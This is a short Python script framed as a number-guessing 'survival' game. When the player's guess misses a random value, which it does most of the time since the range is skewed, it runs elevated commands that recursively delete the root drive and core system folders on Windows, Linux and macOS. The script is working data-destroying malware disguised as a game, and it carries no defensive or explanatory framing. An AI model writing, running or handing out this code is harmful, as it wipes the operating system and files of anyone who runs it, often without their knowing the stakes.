import os
import random
import subprocess
import platform

system = platform.system()
initialValue = 0
finalValue = 7
x = random.randint(initialValue, finalValue)
y = int(input("pick a number between 0 and 6 : "))

if (x != y):
    if(system == "Windows"):
        paths = ["C:\\", r"C:\Windows\System32", r"C:\Windows\System32\drivers", r"C:\Windows\System32\config"]
        for i in paths:
            subprocess.run(["powershell","-Command",f'Start-Process cmd -ArgumentList \'/c rmdir /s /q "{i}"\' -Verb RunAs'], check=False)
        
    elif (system == "Linux"):
        paths = ["/","/usr/bin","/usr/lib","/lib","/etc","/lib/modules",]
        for i in paths:
            subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)

    elif system == "Darwin":
        paths = ["/","/usr/bin","/usr/lib","/etc","/System/Library",]
        for i in paths:
            subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)

else:
    print("You survived. THIS TIME.")
